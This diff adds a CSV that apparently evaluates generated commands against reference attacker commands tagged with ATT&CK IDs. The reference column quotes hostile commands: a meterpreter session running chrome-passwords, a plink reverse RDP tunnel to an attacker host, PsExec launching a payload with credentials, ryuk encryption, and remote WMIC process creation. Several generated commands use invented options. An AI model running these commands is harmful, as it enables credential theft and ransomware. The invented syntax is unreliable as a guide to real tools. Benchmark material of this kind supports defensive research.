@@ -1,0 +1,25 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_adfind_TA0002_T1204.txt,adfind,adfind msDS-ReplConnectionFailures,`adfind.exe -f (objectcategory=person) > ad_users.txt`,0.409,True
+command_adfind_TA0002_T1204.txt,adfind,"adfind msDS-ReplLinkFailures -f ""msPKIRoamingTimeStamp:<timestamp>""",`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.348,True
+command_adfind_TA0002_T1204.txt,adfind,adfind msDS-ReplPendingOps -c 10 -s,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.337,True
+command_adfind_TA0002_T1204.txt,adfind,"adfind msDS-ReplQueueStatistics -f ""msDS-Site-Affinity:<site_name>""",`adfind.exe -subnets -f (objectcategory=subnet) > ad_subnets.txt`,0.318,True
+command_adfind_TA0002_T1204.txt,adfind,"adfind msDS-RetiredReplNCSignatures -f ""msPKIRoamingTimeStamp:<timestamp>""",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,0.328,True
+command_adfind_TA0007_T1482.txt,adfind,"adfind -b <basedn> -f ""(objectcategory=group)(|!(name=*Domain Group))"" -a dn","adfind -f ""(objectcategory=group)""`",0.613,True
+command_adfind_TA0007_T1482.txt,adfind,"adfind -b <basedn> -f ""(objectcategory=group)(|(msDS-GroupType=3)(!msDS-GroupType=2))"" -a trustParent",`adfind.exe -f (objectcategory=group) > ad_group.txt`,0.506,True
+command_adfind_TA0007_T1482.txt,adfind,"adfind -b <basedn> -f ""(objectcategory=computer)(|!(name=*Domain Computer))"" -a trustChild",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,0.613,True
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.438,True
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
+command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p <local_app_chrome_directory>\User Data\Default\Cookies.db,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.269,True
+command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p <local_app_chrome_directory>\User Data\Default\Login Data.sqlitedb,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.252,True
+command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p <local_app_chrome_directory>\User Data\Default\Local Storage.sqlitedb,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.247,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -no-sanitise-stdout,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.427,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -no-antispoof,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.464,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -ssh <attacker_ssh_user>@<cdn_domain> -P 443,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",0.503,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -R <local_port>:localhost:<local_port>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",0.322,True
+command_psexec_TA0007_T1057.txt,psexec,psexec \\* -u <username> -p <password> -d cmd /c tasklist,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.33,True
+command_ryuk_TA0005_T1497.txt,ryuk,ryuk --check-sandbox <drive_size>,`ryuk.exe --encrypt --process-name notepad.exe`,0.375,True
+command_ryuk_TA0007_T1497.txt,ryuk,ryuk.exe --check-sandbox,`ryuk.exe --encrypt --process-name notepad.exe`,0.507,True
+command_ryuk_TA0007_T1497.txt,ryuk,ryuk.exe --sandbox-evasion <drive_size>,`ryuk.exe --encrypt --process-name notepad.exe`,0.395,True
+command_wmic_TA0007_T1082.txt,wmic,wmic os get /value,"`wmic /node:#{""POS system""} process call create #{""executable""}`",0.293,True
+command_wmic_TA0007_T1082.txt,wmic,"wmic path win32_videodescriptor get vidmode, width, height /value","`wmic /node:#{""POS system""} process call create #{""executable""}`",0.264,True
